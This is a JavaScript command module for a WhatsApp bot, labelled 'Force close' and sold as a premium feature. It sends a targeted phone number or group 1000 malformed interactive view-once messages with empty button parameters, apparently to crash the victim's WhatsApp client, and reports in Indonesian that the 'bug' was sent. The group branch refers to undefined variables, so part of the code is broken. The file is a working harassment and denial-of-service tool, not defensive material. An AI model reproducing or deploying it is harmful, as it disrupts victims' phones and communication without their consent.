import { isJidGroup } from "@bayumahadika/baileysx";
import utils from "@bayumahadika/utils";
import chalk from "chalk";

export default {
  description: "Force close",
  onlyOwner: false,
  onlyPremium: true,
  handle: async (sock, m) => {
    if ((!m.fromMe && !m.isOwner) || !m.args[0]) return;
    if (isJidGroup(m.args[0])) {
      const group = Object.values(await sock.groupFetchAllParticipating()).find(
        (group) => group.id === m.args[0],
      );
      if (!group)
        return m.replyError(
          `${m.args[0]} tidak terdaftar atau belum bergabung dengan group tersebut.`,
        );
      await m.reply(global.mess.spam);
      try {
        await utils.sleep(500);
        await sock.relay(
          jid,
          {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: global.bot.name,
                  },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "",
                      },
                      {
                        name: "call_permission_request",
                        buttonsParamsJson: "",
                      },
                    ],
                  },
                },
              },
            },
          },
          {
            useUserDevicesCache: true,
          },
        );
        console.log(
          `${chalk.bgBlueBright.bold.white(
            `\x20[${i + 1}] FORCE CLOSE\x20`,
          )}: ${group.id}`,
        );
      } catch (err) {
        console.log(err);
      }
      await m.reply("Bug berhasil dikirim");
      return;
    }
    const number = m.args[0].replace(/\D/g, "");
    const jid = (await sock.onWhatsApp(`${number}@s.whatsapp.net`))[0]?.jid;
    if (!jid) return m.replyError(`${m.args[0]} tidak terdaftar diwhatsapp`);
    await m.reply(global.mess.spam);
    for (let i = 0; i < 1000; i++) {
      try {
        await utils.sleep(500);
        await sock.relayMessage(
          jid,
          {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: global.bot.name,
                  },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "",
                      },
                      {
                        name: "call_permission_request",
                        buttonsParamsJson: "",
                      },
                    ],
                  },
                },
              },
            },
          },
          { participant: { jid } },
        );
        console.log(
          `${chalk.bgBlueBright.bold.white(
            `\x20[${i + 1}] FORCE CLOSE\x20`,
          )}: ${jid}`,
        );
      } catch (err) {
        console.log(err);
      }
    }
  },
};
